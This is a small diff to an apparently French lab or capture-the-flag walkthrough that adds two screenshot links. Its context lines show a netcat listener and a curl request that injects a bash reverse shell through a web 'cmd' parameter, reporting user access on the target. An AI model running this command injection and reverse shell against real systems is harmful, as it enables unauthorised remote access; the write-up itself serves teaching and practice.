@@ -157,6 +157,10 @@ nc -lvnp 7777
 curl "http://192.168.188.214:8080/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.188.128/7777%200>%261'"
 ```
 
+![image5](https://github.com/user-attachments/assets/ffaa58c5-ad24-4938-a740-ecf05c40652d)
+![image19](https://github.com/user-attachments/assets/0e5dabf4-ff0a-48e1-852a-9b4a625d256f)
+
+
 ✅ **Accès utilisateur obtenu sur la machine cible !**  
 
 ---
